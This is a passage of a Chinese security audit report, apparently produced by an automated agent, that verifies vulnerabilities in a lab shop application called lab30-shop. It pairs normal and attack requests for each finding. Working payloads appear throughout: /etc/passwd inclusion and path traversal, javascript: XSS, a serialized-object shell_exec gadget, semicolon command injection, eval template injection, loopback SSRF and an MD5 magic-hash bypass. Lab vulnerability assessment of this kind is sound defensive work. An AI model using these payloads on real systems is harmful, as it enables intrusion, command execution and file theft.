### C-15 运营远程模板预览将 GET template 直接 include 造成任意本地文件包含

- verification `8495a233fb2f4e0f8107473a455c9469`（finding `755caa0a9ce04369bac0bc106f3406d2` revision 1，context `767394c7c493447896fb434c0adf6ebb`，target lab30-shop-1.0.0）
  - 执行状态：执行完成；判定：confirmed；来源：poc_agent
  - 正常侧观测：正常侧：operator 会话下 GET /ops/template-preview.php?template=http://fixtures:8080/templates/season.php 返回 NORMAL_REMOTE 200，<section id="remote-template"> 渲染远程模板内容“合作方 · 秋日生活提案 / 让生活慢下来，把好物带回家。”，不含 /etc/passwd 内容（ROOT False）；不传 template 时返回 EMPTY 200 且无 include 内容。
  - 攻击侧观测：攻击侧 GET /ops/template-preview.php?template=/etc/passwd 返回 200，页面 <section id="remote-template"> 内原文回显 'root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:...'（ROOT True、BASH True），即 GET 参数被直接 include 为本地绝对路径，泄露任意可读文件内容。
  - 已保存作业事实：2 个；满足执行及前提检查的作业：1 个。作业完成不等同于漏洞成立。
  - 已观测作业 ID：`80f80ec7058b4fdf90264fda825fc1bf`；`147d495941874bcf9c442a3e8a521ee7`
  - 结论结束原因：completed；执行阶段结束原因：未记录
  - 作业：`147d495941874bcf9c442a3e8a521ee7` script finished exit=0
  - 适配脚本：`8495a233-adapted-lfi_template_preview.py`（见证据包 evidence/）
  - 备注：作业 147d495941874bcf9c442a3e8a521ee7（identity=operator，exit_code=0，evidence_usable=true）stdout 同时给出三组观测：默认远程 URL 返回 200 且 #remote-template 渲染“合作方 · 秋日生活提案”（ROOT False，说明远程 include 亦生效、allow_url_include 未禁止）；无 template 参数 200 且 ROOT False（空模板不 include）；/etc/passwd 时 ROOT True/BASH True 并给出原文片段。源码 template-preview.php:2 require_user(['operator','admin'])，:3 if($template!=='')include $template，无 basename/白名单/realpath 校验。角色前提来自源码，故使用 operator；先前 alice 作业 80f80ec7058b4fdf90264fda825fc1bf 返回 403 仅说明角色前提，未作为漏洞证据。

- 正式复核 `98ac40a54198459db4306fd770962c8d`：复核确认；引用 revision 1 / verification `8495a233fb2f4e0f8107473a455c9469`
  - 理由：两侧观测完整对照：normal 侧 operator 加载默认 template=http://fixtures:8080/templates/season.php 时 #remote-template 渲染合作方模板内容且 ROOT False；attack 侧同一会话 template=/etc/passwd 返回 200 且 <section id="remote-template"> 内原文回显 'root:x:0:0:root:/root:/bin/bash'（ROOT True、BASH True），与源码 template-preview.php:3 include $template 一致，任意本地文件包含成立，远程包含同时可用。
  - 复核观测：正常侧 正常侧：operator 会话下 GET /ops/template-preview.php?template=http://fixtures:8080/templates/season.php 返回 NORMAL_REMOTE 200，<section id="remote-template"> 渲染远程模板内容“合作方 · 秋日生活提案 / 让生活慢下来，把好物带回家。”，不含 /etc/passwd 内容（ROOT False）；不传 template 时返回 EMPTY 200 且无 include 内容。；攻击侧 攻击侧 GET /ops/template-preview.php?template=/etc/passwd 返回 200，页面 <section id="remote-template"> 内原文回显 'root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:...'（ROOT True、BASH True），即 GET 参数被直接 include 为本地绝对路径，泄露任意可读文件内容。

### C-16 account/profile.php 将 GET url 原样拼入 href，javascript: 伪协议反射型 XSS

- verification `22fd5e6b9dcb48038f25a82f04a9defe`（finding `7d425e28404445b7b8301548aba889b1` revision 1，context `8aeb3e4445d246d29657307eca7ed6d9`，target lab30-shop-1.0.0）
  - 执行状态：执行完成；判定：confirmed；来源：poc_agent
  - 正常侧观测：正常侧：url=https://example.com/ 时页面回显含 href="https://example.com/"，普通 http 链接被正常写入“访问个人主页”锚点（job ac6c74c3db834bf4b89b3560186e71ed stdout 的 NORMAL True）。
  - 攻击侧观测：攻击侧：HTTP 层 url=javascript:alert(1) 时响应片段为 <a id="profile-link" href="javascript:alert(1)">访问个人主页</a>，伪协议被原样写入 href（job ac6c74c3db834bf4b89b3560186e71ed）。浏览器侧在同一 finding 上下文中以 alice 会话加载 /account/profile.php?url=javascript%3Aalert(document.domain)，页面求值结果 {"href":"javascript:alert(document.domain)","clicked":true}，脚本点击 #profile-link 后弹出对话框，dialogs=["lab30"]，即 payload 中的 alert(document.domain) 在 alice 已登录会话内真实执行（job 42968eb618494081a712c26480717275）。
  - 已保存作业事实：2 个；满足执行及前提检查的作业：2 个。作业完成不等同于漏洞成立。
  - 已观测作业 ID：`ac6c74c3db834bf4b89b3560186e71ed`；`42968eb618494081a712c26480717275`
  - 结论结束原因：completed；执行阶段结束原因：未记录
  - 作业：`ac6c74c3db834bf4b89b3560186e71ed` script finished exit=0；`42968eb618494081a712c26480717275` browser finished exit=0
  - 产物：`22fd5e6b9dcb48038f25a82f04a9defe-42968eb618494081a712c26480717275-screenshot.png`
  - 适配脚本：`22fd5e6b-adapted-profile_xss_poc.py`（见证据包 evidence/）
  - 备注：宿主导入的审计 POC（job ac6c74c3db834bf4b89b3560186e71ed，identity=alice，exit_code=0）给出正常/攻击 HTTP 对照：NORMAL True 表示 url=https://example.com/ 时页面含有 href="https://example.com/"；攻击请求含未编码的 href="javascript:alert(1)"。该作业只证明反射，不证明执行。执行证据由本上下文的 browser job 42968eb618494081a712c26480717275（kind=browser，identity=alice，exit_code=0）提供：dialogs 通道原文为 "lab30"，evaluated 通道原文为 {"href":"javascript:alert(document.domain)","clicked":true}。源码 profile.php:2 取 $_GET['url'] 回退 homepage，:3 直接拼入 href="'.$url.'"，未用 bootstrap.php:10 的 h()；h() 本身也只做 htmlspecialchars，不能阻止 javascript: 伪协议。

- 正式复核 `e1b5970653f842dbbed95d055b6d382b`：复核确认；引用 revision 1 / verification `22fd5e6b9dcb48038f25a82f04a9defe`
  - 理由：两侧观测完整对照：normal 侧 url=https://example.com/ 时 href 正常回显；attack 侧 HTTP 层 url=javascript:alert(1) 原样进入 href（job ac6c74c3），浏览器会话中加载 url=javascript:alert(document.domain) 后脚本点击 #profile-link 弹出对话框 lab30（job 42968eb6），与 profile.php:3 未编码输出 $url 的源码缺陷吻合，反射型 XSS 确认。
  - 复核观测：正常侧 正常侧：url=https://example.com/ 时页面回显含 href="https://example.com/"，普通 http 链接被正常写入“访问个人主页”锚点（job ac6c74c3db834bf4b89b3560186e71ed stdout 的 NORMAL True）。；攻击侧 攻击侧：HTTP 层 url=javascript:alert(1) 时响应片段为 <a id="profile-link" href="javascript:alert(1)">访问个人主页</a>，伪协议被原样写入 href（job ac6c74c3db834bf4b89b3560186e71ed）。浏览器侧在同一 finding 上下文中以 alice 会话加载 /account/profile.php?url=javascript%3Aalert(document.domain)，页面求值结果 {"href":"javascript:alert(document.domain)","clicked":true}，脚本点击 #profile-link 后弹出对话框，dialogs=["lab30"]，即 payload 中的 alert(document.domain) 在 alic…

### C-17 任务导入 unserialize 用户数据触发 DispatchJob::__wakeup 的 shell_exec 命令执行

- verification `d68242772755402cae8dd0ef35c890f4`（finding `fe228c9b642d456694f9b45fb29d5e92` revision 1，context `29cc5b48d8a145d59886ef152317791c`，target lab30-shop-1.0.0）
  - 执行状态：执行完成；判定：confirmed；来源：poc_agent
  - 正常侧观测：正常侧：POST 页面提供的示例任务（base64(O:11:"DispatchJob":1:{s:7:"command";s:22:"printf inventory-ready";})），返回 NORMAL 200 且含“任务已导入并执行”，<pre> 仅输出 'inventory-ready'，即默认 command 的预期结果。
  - 攻击侧观测：攻击侧提交伪造的 base64 序列化对象 O:11:"DispatchJob":1:{s:7:"command";s:23:"id;echo JOBDES_fe228c9b";}。POST /ops/jobs.php 返回 ATTACK 200 且含“任务已导入并执行”，页面 <pre> 输出 'uid=33(www-data) gid=33(www-data) groups=33(www-data)\nJOBDES_fe228c9b\n'（MARKER True、UID True）。该输出在 instanceof 校验之前由 unserialize 触发的 __wakeup→shell_exec($this->command) 产生，命令内容完全来自攻击者序列化属性。
  - 已保存作业事实：1 个；满足执行及前提检查的作业：1 个。作业完成不等同于漏洞成立。
  - 已观测作业 ID：`fc42d9aa56fb4156b10a2ad124d0eed8`
  - 结论结束原因：completed；执行阶段结束原因：未记录
  - 作业：`fc42d9aa56fb4156b10a2ad124d0eed8` script finished exit=0
  - 适配脚本：`d6824277-adapted-poc_ops_jobs_deserialize.py`（见证据包 evidence/）
  - 备注：作业 fc42d9aa56fb4156b10a2ad124d0eed8（identity=operator，exit_code=0，evidence_usable=true）stdout 同时给出正常与攻击两侧：EXAMPLE 为页面示例 O:11:"DispatchJob":{command:"printf inventory-ready"}；NORMAL_PRE='inventory-ready'；ATTACK_SER 为构造对象；ATTACK_PRE 含 www-data 身份与唯一标记。源码 jobs.php:3 在 ob_start 后先 unserialize（第4行附近为页面示例），instanceof 检查在其后；src/dispatch_job.php:4 __wakeup echo shell_exec($this->command)，command 为 public 属性，完全符合动态行为。require_user(['operator','admin']) 是源码前提，故使用 operator 身份；未用特权身份冒充普通会员。命令以 uid=33(www-data) 执行，输出同时写入 jobs.details（源码 INSERT）。

- 正式复核 `678d5f50b3f44514ac0b620dd44e94c9`：复核确认；引用 revision 1 / verification `d68242772755402cae8dd0ef35c890f4`
  - 理由：两侧观测完整对照：normal 侧提交示例序列化 DispatchJob(command='printf inventory-ready') 仅输出 inventory-ready；attack 侧 command='id;echo JOBDES_fe228c9b' 的序列化对象在 200 响应 <pre> 回显 uid=33(www-data) 与唯一标记，与 jobs.php:3 unserialize 先于 instanceof、dispatch_job.php:4 __wakeup 执行 shell_exec 的源码一致，不可信反序列化命令执行确认。
  - 复核观测：正常侧 正常侧：POST 页面提供的示例任务（base64(O:11:"DispatchJob":1:{s:7:"command";s:22:"printf inventory-ready";})），返回 NORMAL 200 且含“任务已导入并执行”，<pre> 仅输出 'inventory-ready'，即默认 command 的预期结果。；攻击侧 攻击侧提交伪造的 base64 序列化对象 O:11:"DispatchJob":1:{s:7:"command";s:23:"id;echo JOBDES_fe228c9b";}。POST /ops/jobs.php 返回 ATTACK 200 且含“任务已导入并执行”，页面 <pre> 输出 'uid=33(www-data) gid=33(www-data) groups=33(www-data)\nJOBDES_fe228c9b\n'（MARKER True、UID True）。该输出在 instanceof 校验之前由 unserialize 触发的 __wakeup→shell_exec($this->command) 产生，命令内容完全来自攻击者序列化属性。

### C-18 support/download.php 直接拼接 $_GET['file'] 到文档目录，导致任意文件读取

- verification `80c001a08bbb45329fdcc10620cb7663`（finding `eac118f98bf744b498228eacf22fd396` revision 1，context `dc724d88b6844f4397b8d9c4509b55e6`，target lab30-shop-1.0.0）
  - 执行状态：执行完成；判定：confirmed；来源：poc_agent
  - 正常侧观测：已登录 alice（MEMBER_SESSION 200）访问 /support/download.php?file=shipping.txt 返回 200，正文为 docs 目录内的正常文档“配送说明：工作日 48 小时内发货。”；请求不存在的 no-such-doc-9f3a.txt 返回 404“请求未完成”（fail_request 分支），说明普通输入只命中 docs 目录内文件。
  - 攻击侧观测：同一 alice 会话请求 /support/download.php?file=../../../../etc/passwd 返回 200，正文为 system passwd 文件前 400 字节：root:x:0:0:root:/root:/bin/bash、daemon:x:1:1...、bin、sys、sync、games、man、lp、mail、news 等条目，证明 ../ 序列穿出 data_dir()/docs 读取了任意系统文件。
  - 已保存作业事实：1 个；满足执行及前提检查的作业：1 个。作业完成不等同于漏洞成立。
  - 已观测作业 ID：`406729dd46cf475589ebac2c1f0cf7a7`
  - 结论结束原因：completed；执行阶段结束原因：未记录
  - 作业：`406729dd46cf475589ebac2c1f0cf7a7` script finished exit=0
  - 适配脚本：`80c001a0-adapted-poc.php`（见证据包 evidence/）

- 正式复核 `110ec2f4a3434910abc95d35f9fefe0c`：复核确认；引用 revision 1 / verification `80c001a08bbb45329fdcc10620cb7663`
  - 理由：已完整读取 normal_observation 与 attack_observation：normal 侧 alice 请求 file=shipping.txt 得 200 且正文为 docs 内配送说明、不存在文件为 404，说明正常输入被限制在 docs 目录；attack 侧 file=../../../../etc/passwd 得 200 且正文为 root:x:0:0:root:/root:/bin/bash 等 system passwd 条目，穿透成立。与源码 download.php:3 无 basename/realpath 的拼接一致，判 confirmed。
  - 复核观测：正常侧 已登录 alice（MEMBER_SESSION 200）访问 /support/download.php?file=shipping.txt 返回 200，正文为 docs 目录内的正常文档“配送说明：工作日 48 小时内发货。”；请求不存在的 no-such-doc-9f3a.txt 返回 404“请求未完成”（fail_request 分支），说明普通输入只命中 docs 目录内文件。；攻击侧 同一 alice 会话请求 /support/download.php?file=../../../../etc/passwd 返回 200，正文为 system passwd 文件前 400 字节：root:x:0:0:root:/root:/bin/bash、daemon:x:1:1...、bin、sys、sync、games、man、lp、mail、news 等条目，证明 ../ 序列穿出 data_dir()/docs 读取了任意系统文件。

### C-19 商品目录搜索 q 参数直接拼接进 LIKE 查询（反射型 SQL 注入）

- verification `f01c86d72f40457cbba40d89b441209f`（finding `2aad233871a24c91a491d81b3fea08ac` revision 1，context `9d4400caebb942f68df54dfd036b4d80`，target lab30-shop-1.0.0）
  - 执行状态：执行失败；判定：不确定；来源：poc_agent
  - 正常侧观测：未记录
  - 攻击侧观测：未记录
  - 已保存作业事实：1 个；满足执行及前提检查的作业：0 个。作业完成不等同于漏洞成立。
  - 结论未完整发布；缺少正常／攻击侧发布内容不代表没有执行观测。
  - 已观测作业 ID：`d83fe76f84624cbcb07fd030fea77efe`
  - 结论结束原因：submission_unresolved；执行阶段结束原因：submission_unresolved
  - 作业：`d83fe76f84624cbcb07fd030fea77efe` script unknown exit=None

### C-20 运营主机巡检 host 参数未过滤直接拼接 shell_exec 造成命令注入

- verification `326f95f4b21441eb9c55a210a337a4f8`（finding `7d557370dabe4a41ba0c681deb30a0a1` revision 1，context `a9b9d308c231467f9dd8a655cfc97f9e`，target lab30-shop-1.0.0）
  - 执行状态：执行完成；判定：confirmed；来源：poc_agent
  - 正常侧观测：正常侧 GET /ops/ping.php?host=127.0.0.1 返回 NORMAL 200，<pre id="diagnostic-output"> 仅为 ping 回显（64 bytes from 127.0.0.1、1 packets transmitted/1 received、rtt 统计），无任何额外命令输出。
  - 攻击侧观测：攻击侧 GET /ops/ping.php?host=127.0.0.1;id;echo CMDBASH_7d557370（URL 编码后）返回 ATTACK 200，<pre id="diagnostic-output"> 中在 ping 统计之后额外出现 `uid=33(www-data) gid=33(www-data) groups=33(www-data)` 与唯一标记 `CMDBASH_7d557370`（MARKER True、UID True）。该输出只能由分号分隔的第二、三条 shell 命令产生，证明 host 参数未经 escapeshellarg/白名单直接拼接进 shell_exec 并执行。
  - 已保存作业事实：2 个；满足执行及前提检查的作业：1 个。作业完成不等同于漏洞成立。
  - 已观测作业 ID：`c93862d38f1147f9baa0234079617812`；`b308d1db627f46f397de2e21ed885c21`
  - 结论结束原因：completed；执行阶段结束原因：未记录
  - 作业：`b308d1db627f46f397de2e21ed885c21` script finished exit=0
  - 适配脚本：`326f95f4-adapted-poc_ops_ping_cmdi.py`（见证据包 evidence/）
  - 备注：作业 b308d1db627f46f397de2e21ed885c21（identity=operator，exit_code=0，evidence_usable=true）stdout 同时包含两侧原文：OPS_ACCESS 200（operator 可进运营台）、NORMAL_PRE 仅 ping 统计、ATTACK_PRE 含 www-data 身份与唯一标记。源码 ping.php:2 为 `(string)shell_exec('ping -c 1 -W 1 '.$host)`、第3行 h($output) 回显，无任何转义/白名单；batch-check.php:2 经 src/host_check.php:2 同一拼接方式（源码等价，本次未单独动态触发）。前置角色由 require_user(['operator','admin']) 指定，因此使用 operator 身份是源码要求、非以特权冒充普通会员；先前 alice（customer）作业 c93862d38f1147f9baa0234079617812 返回 403，仅说明角色前提，未作为漏洞证据。命令以 www-data(uid=33) 执行。

- 正式复核 `8138de8717a4432caf1924eb6a84716d`：复核确认；引用 revision 1 / verification `326f95f4b21441eb9c55a210a337a4f8`
  - 理由：两份观测已完整读取：normal 侧 operator 会话 host=127.0.0.1 的 <pre> 仅含 ping 统计，无额外输出；attack 侧 host=127.0.0.1;id;echo CMDBASH_7d557370 在同一 <pre> 中额外出现 uid=33(www-data)/gid=33(www-data) 与唯一标记 CMDBASH_7d557370，只能由分号后命令执行产生，与 ping.php:2 未转义拼接 shell_exec 一致，判 confirmed。
  - 复核观测：正常侧 正常侧 GET /ops/ping.php?host=127.0.0.1 返回 NORMAL 200，<pre id="diagnostic-output"> 仅为 ping 回显（64 bytes from 127.0.0.1、1 packets transmitted/1 received、rtt 统计），无任何额外命令输出。；攻击侧 攻击侧 GET /ops/ping.php?host=127.0.0.1;id;echo CMDBASH_7d557370（URL 编码后）返回 ATTACK 200，<pre id="diagnostic-output"> 中在 ping 统计之后额外出现 `uid=33(www-data) gid=33(www-data) groups=33(www-data)` 与唯一标记 `CMDBASH_7d557370`（MARKER True、UID True）。该输出只能由分号分隔的第二、三条 shell 命令产生，证明 host 参数未经 escapeshellarg/白名单直接拼接进 shell_exec 并执行。

### C-21 运营模板渲染将 {{...}} 表达式直接传入 eval 造成代码执行

- verification `7bdfc66438d24cf39067adedd03bf674`（finding `cbc0430810e6455eabc064331bd9a754` revision 1，context `1cfd97b7320e44069e2c2670975aec18`，target lab30-shop-1.0.0）
  - 执行状态：执行完成；判定：confirmed；来源：poc_agent
  - 正常侧观测：正常侧：operator 登录后 GET /ops/template-render.php 返回 200；以真实 csrf POST template='total {{ 2 + 2 }}'，返回 NORMAL 200，<pre> 输出 'total 4'，即正常算术表达式按模板渲染。
  - 攻击侧观测：攻击侧提交 template={{ system("id;echo EVALMARK_cbc04308") }}：返回 200，响应正文在 doctype 之前出现 'uid=33(www-data) gid=33(www-data) groups=33(www-data)\nEVALMARK_cbc04308\n'，<pre> 中为 system() 返回值 'EVALMARK_cbc04308'，全响应 MARKER True。即双花括号内表达式被 eval 执行，system() 以 www-data 权限运行了注入命令。
  - 已保存作业事实：3 个；满足执行及前提检查的作业：2 个。作业完成不等同于漏洞成立。
  - 已观测作业 ID：`a457ffaa9d67491ab80f96433d95417d`；`a5163370169b4bc29f705182e88496df`；`2e04e2ed830d40ab8ee81baa1a118010`
  - 结论结束原因：completed；执行阶段结束原因：未记录
  - 作业：`a5163370169b4bc29f705182e88496df` script finished exit=0；`2e04e2ed830d40ab8ee81baa1a118010` script finished exit=0
  - 适配脚本：`7bdfc664-adapted-code_exec_template_render.py`（见证据包 evidence/）
  - 备注：作业 a5163370169b4bc29f705182e88496df 与 2e04e2ed830d40ab8ee81baa1a118010（identity=operator，exit_code=0，evidence_usable=true）分别给出正常/攻击与原始执行片段：NORMAL PRE='total 4'；ATTACK PRE='EVALMARK_cbc04308'、uid=33(www-data) gid=33(www-data) 出现在响应正文。源码 template-render.php:2 require_user(['operator','admin'])，:3 preg_replace_callback('/\{\{(.*?)\}\}/s') 后 eval('return '.$m[1].';') 并 h($result) 回显，与行为一致。require_user 的角色限制是源码前提，故使用 operator 身份；先前 alice（customer）作业 a457ffaa9d67491ab80f96433d95417d 返回 403，仅说明角色前提，不作为漏洞证据。命令以 uid=33(www-data) 执行。

- 正式复核 `a816ce59f2a540c289a5a9d67074fc12`：复核确认；引用 revision 1 / verification `7bdfc66438d24cf39067adedd03bf674`
  - 理由：已完整读取两侧观测：正常侧 operator 以真实 csrf POST 'total {{ 2 + 2 }}' 返回 200，<pre> 输出 total 4；攻击侧 POST {{ system("id;echo EVALMARK_cbc04308") }} 返回 200，响应正文在 doctype 前回显 uid=33(www-data)、gid=33(www-data) 与唯一标记 EVALMARK_cbc04308，全响应 MARKER True。对照 template-render.php:3 的 eval 拼接，确认任意 PHP 表达式/命令执行，判为 confirmed。
  - 复核观测：正常侧 正常侧：operator 登录后 GET /ops/template-render.php 返回 200；以真实 csrf POST template='total {{ 2 + 2 }}'，返回 NORMAL 200，<pre> 输出 'total 4'，即正常算术表达式按模板渲染。；攻击侧 攻击侧提交 template={{ system("id;echo EVALMARK_cbc04308") }}：返回 200，响应正文在 doctype 之前出现 'uid=33(www-data) gid=33(www-data) groups=33(www-data)\nEVALMARK_cbc04308\n'，<pre> 中为 system() 返回值 'EVALMARK_cbc04308'，全响应 MARKER True。即双花括号内表达式被 eval 执行，system() 以 www-data 权限运行了注入命令。

### C-22 运营 URL 预览 GET url 直接交给 file_get_contents 造成 SSRF

- verification `7b3b3608fd2446ba90f67fa1c1d30fef`（finding `bc328ee5aef640c58a4a4f22afe0015e` revision 1，context `6368006f9aa24c41b3b701eb357b7e32`，target lab30-shop-1.0.0）
  - 执行状态：执行完成；判定：confirmed；来源：poc_agent
  - 正常侧观测：正常侧：operator 登录后 GET /ops/url-preview.php 返回 ACCESS 200；url=http://fixtures:8080/catalog-info 时 NORMAL 200，<pre> 输出 fixtures 返回的合作方摘要“拾光合作方商品摘要：本季上新四款日常好物，工作日统一配送。”，未包含商城首页或内网内容。
  - 攻击侧观测：攻击侧 GET /ops/url-preview.php?url=http://127.0.0.1:80/ 返回 200，<pre> 中出现服务端从回环地址取回的商城首页 HTML（经 h() 转义为 &lt;!doctype html&gt;…&lt;title&gt;让每一份日常，都值得期待 · 拾光商城&lt;/title&gt;…），LOOPBACK_SHOP True；http://localhost:80/ 同样返回首页 HTML（LOOPBACK2_SHOP True）。即 operator 可控 URL 被 file_get_contents 在服务器侧向回环地址发起请求并回显响应。
  - 已保存作业事实：2 个；满足执行及前提检查的作业：1 个。作业完成不等同于漏洞成立。
  - 已观测作业 ID：`321cf3cbd94d4540a99c02d1d30f1924`；`573debc17fef498e8f46d2a52ff4116d`
  - 结论结束原因：completed；执行阶段结束原因：未记录
  - 作业：`573debc17fef498e8f46d2a52ff4116d` script finished exit=0
  - 适配脚本：`7b3b3608-adapted-ssrf_url_preview.py`（见证据包 evidence/）
  - 备注：作业 573debc17fef498e8f46d2a52ff4116d（identity=operator，exit_code=0，evidence_usable=true）stdout 同时包含两侧：ACCESS 200（operator 可进运营预览）、NORMAL PRE 为 fixtures 返回的“拾光合作方商品摘要：本季上新四款日常好物，工作日统一配送。”、ATTACK/ATTACK2 PRE 为回环 127.0.0.1:80 与 localhost:80 的商城首页 HTML。源码 url-preview.php:2 require_user(['operator','admin'])、:3 stream_context 仅 timeout=4 与 follow_location=0，无协议/主机白名单即 @file_get_contents($url)，:4 h($output) 回显。require_user 角色门禁为源码前提，故使用 operator；先前 alice 作业 321cf3cbd94d4540a99c02d1d30f1924 返回 403 仅说明角色前提，未作为漏洞证据。

- 正式复核 `33aa5cb6e39643cabd8c04d094bdfb63`：复核确认；引用 revision 1 / verification `7b3b3608fd2446ba90f67fa1c1d30fef`
  - 理由：已完整读取两侧观测：正常侧 url=http://fixtures:8080/catalog-info 返回 200 且 <pre> 为合作方摘要文本；攻击侧 url=http://127.0.0.1:80/ 与 http://localhost:80/ 均返回 200，<pre> 中出现服务端取回的商城首页 HTML（h() 转义后的 doctype/title），LOOPBACK_SHOP 与 LOOPBACK2_SHOP 均为 True。对照 url-preview.php:2-3 无协议/主机/私网校验的 file_get_contents，确认 SSRF，判为 confirmed。
  - 复核观测：正常侧 正常侧：operator 登录后 GET /ops/url-preview.php 返回 ACCESS 200；url=http://fixtures:8080/catalog-info 时 NORMAL 200，<pre> 输出 fixtures 返回的合作方摘要“拾光合作方商品摘要：本季上新四款日常好物，工作日统一配送。”，未包含商城首页或内网内容。；攻击侧 攻击侧 GET /ops/url-preview.php?url=http://127.0.0.1:80/ 返回 200，<pre> 中出现服务端从回环地址取回的商城首页 HTML（经 h() 转义为 &lt;!doctype html&gt;…&lt;title&gt;让每一份日常，都值得期待 · 拾光商城&lt;/title&gt;…），LOOPBACK_SHOP True；http://localhost:80/ 同样返回首页 HTML（LOOPBACK2_SHOP True）。即 operator 可控 URL 被 file_get_contents 在服务器侧向回环地址发起请求并回显响应。

### C-23 account/redeem.php 使用 == 比较 MD5，弱类型绕过兑换码免费升级金卡

- verification `68f88c599e974fcaace48aa481a4ae3c`（finding `5a0a00576fa249cfb5ad3466c54cf27f` revision 1，context `9d205c77127c40d6ab76518d92adb12c`，target lab30-shop-1.0.0）
  - 执行状态：执行完成；判定：confirmed；来源：poc_agent
  - 正常侧观测：正常侧：攻击前当前用户 tier=standard；以同一 csrf 提交错误 token=wrong-token（其 md5 非 0e 前缀数字），返回 NORMAL 422 {"accepted":false,"message":"兑换码无效。"}，未发生升级。
  - 攻击侧观测：攻击侧提交 token=QNKCDZO：其 md5 为 0e830400451993494058024219903391（MAGIC_MD5），服务端返回 200 {"accepted":true,"message":"兑换成功，已升级金卡会员。"}；随后当前用户 JSON 显示 tier 由 standard 变为 "gold"（宿主 state_changes 记录 tier standard→gold）。而服务端秘钥哈希为 md5('240610708')=0e462097431906509019562988736854，二者均为 0e 前缀全数字字符串，宽松比较下都被当作 0 而相等。
  - 已保存作业事实：2 个；满足执行及前提检查的作业：2 个。作业完成不等同于漏洞成立。
  - 已观测作业 ID：`bb0d6deace9b4a23b0b3eaec39a24c5d`；`2e92e150ce13429e878ff570fb4f8cd6`
  - 结论结束原因：completed；执行阶段结束原因：未记录
  - 作业：`2e92e150ce13429e878ff570fb4f8cd6` script finished exit=0
  - 适配脚本：`68f88c59-adapted-poc_weak_compare_redeem.py`（见证据包 evidence/）
  - 备注：作业 2e92e150ce13429e878ff570fb4f8cd6（identity=alice，exit_code=0，evidence_usable=true）stdout 同时给出两侧与关键哈希：SECRET_MD5=0e462097431906509019562988736854、MAGIC_MD5=0e830400451993494058024219903391、NORMAL 422、ATTACK 200、ME tier=gold。源码 redeem.php:4 md5('240610708')，:5 md5((string)$_POST['token'])==$secret_hash 使用 ==；:6 失败 422，:7 JSON 输出。先前宿主作业 bb0d6deace9b4a23b0b3eaec39a24c5d 使用 token='0e000...'（其 md5 并非 0e 纯数字）因此两次都 422，属 payload 选择错误，非防护生效；本次用真正魔法值 QNKCDZO 绕过。未使用特权身份，普通会员 alice 即成功。

- 正式复核 `a891638a686b4df4957f1191e43f4254`：复核确认；引用 revision 1 / verification `68f88c599e974fcaace48aa481a4ae3c`
  - 理由：已完整读取两侧观测：正常侧攻击前 tier=standard，提交 wrong-token 得 422 accepted=false；攻击侧提交 QNKCDZO（md5=0e830400451993494058024219903391）得 200 accepted=true 并回显升级成功，随后当前用户 tier=gold，宿主记录 tier standard→gold。对照 redeem.php:4-5 的 md5 == 宽松比较，确认弱类型绕过，判为 confirmed。
  - 复核观测：正常侧 正常侧：攻击前当前用户 tier=standard；以同一 csrf 提交错误 token=wrong-token（其 md5 非 0e 前缀数字），返回 NORMAL 422 {"accepted":false,"message":"兑换码无效。"}，未发生升级。；攻击侧 攻击侧提交 token=QNKCDZO：其 md5 为 0e830400451993494058024219903391（MAGIC_MD5），服务端返回 200 {"accepted":true,"message":"兑换成功，已升级金卡会员。"}；随后当前用户 JSON 显示 tier 由 standard 变为 "gold"（宿主 state_changes 记录 tier standard→gold）。而服务端秘钥哈希为 md5('240610708')=0e462097431906509019562988736854，二者均为 0e 前缀全数字字符串，宽松比较下都被当作 0 而相等。

## 6. 覆盖与未决项

| 独立分母 | 总数 | 已结算 | 未决/待办 | 闭环 |
|---|---:|---:|---:|---|
| 文件覆盖 | 61 | 读取 59；读取+跳过 61 | 0 | 是 |
| 必做方向 | 8 | 已决 8；跳过 0 | 0 | 是 |
| 动态验证 | 23 | 已验证 22；已复核记录 22 | 待验证 0；待复核 0 | — |
| 正式终审 | 23 | 已接受 23 | 待终审 0；存疑 0 | — |

**带理由跳过的文件**

- `lab30-shop/app/bin/reset.php`：与 bin/setup.php 同属 CLI 脚本，已纳入 ops-and-cli 任务范围一并读取。
- `lab30-shop/app/bin/setup.php`：已纳入 ops-and-cli 任务范围。
- `lab30-shop/app/public/account/backup.php`：已纳入 file-and-backup 任务范围。
- `lab30-shop/app/public/account/index.php`：已纳入 entry-routing-auth 任务范围。
- `lab30-shop/compose.yaml`：部署编排文件，仅容器与端口定义，不做运行时漏洞取证
- `lab30-shop/docker/apache.conf`：静态 Web 服务器配置，非第一方业务源码；需要时由部署任务单独复核
- `lab30-shop/docker/entrypoint.sh`：容器启动脚本，非 Web 请求可达路径

**后续建议（不阻止本次收束）**

- `dir_f48161cc01979dea85ed891ae171f997`：lab30-shop/app/src/member_lookup.php:3 中 $term 拼接进 LIKE，上游 ops/members.php:2 仅要求 operator/admin，需评估低权限到高权限横向读取与权限边界
- `dir_0426c7b739326a1be2d5e8edab55dc65`：lab30-shop/app/public/ops/users.php:2 使用 $_COOKIE['role'] 作管理员判定，核查 client-controlled 授权绕过
- `dir_34506f1733c607915ea77da910be515f`：lab30-shop/app/public/account/profile.php:2-3 的 url 直接拼进 href 属性，核查 XSS 可行性
- `dir_7c1d2cab12a766695e839eeb17f2298c`：确认 lab30-shop 运行镜像中 allow_url_include 与 allow_url_fopen 的默认值，以区分 template-preview.php 的 RFI 是否在默认部署下可达（源码内未见 ini_set 禁用）
- `dir_4e18536a235cbde8409ef91d068b5643`：account/profile.php:3 将 $_GET['url'] 直接拼入 <a href="..."> 未编码，存在 href 属性注入/开放重定向候选方向
- `dir_6800dfa1f23f654587a46d48da7d974c`：content/page.php:3 使用 include APP_ROOT.'/resources/views/'.$name.'.php'，$_GET['page'] 可控，需评估 LFI 方向
- `dir_96e2025a68b217bf01ecf861232eca5a`：auth/continue.php:3 将 $_GET['next'] 直接放入 Location 头，存在开放重定向候选方向，需补读确认无白名单校验
- `dir_b594b92c2e3e06d04aec8dfccdfe0dfe`：support/download.php:3 使用 data_dir().'/docs/'.$_GET['file'] 与 file_get_contents，需评估路径穿越方向
- `dir_23beb9e3381c7f561db548226f530653`：lab30-shop/app/public/account/settings.php:3-6 缺少 check_csrf 的 CSRF 修改邮箱路径（需验证 cookie 策略）
- `dir_2e154cf6661479791f0dc6660d32a201`：lab30-shop/app/public/account/backup.php:4-5 unserialize 对象注入可利用性与 gadget 缺失评估
- `dir_7ff0abb7c05239fe5179afc6455e9827`：lab30-shop/app/public/account/redeem.php:4-5 弱比较 md5==md5 的可绕过性证据补充
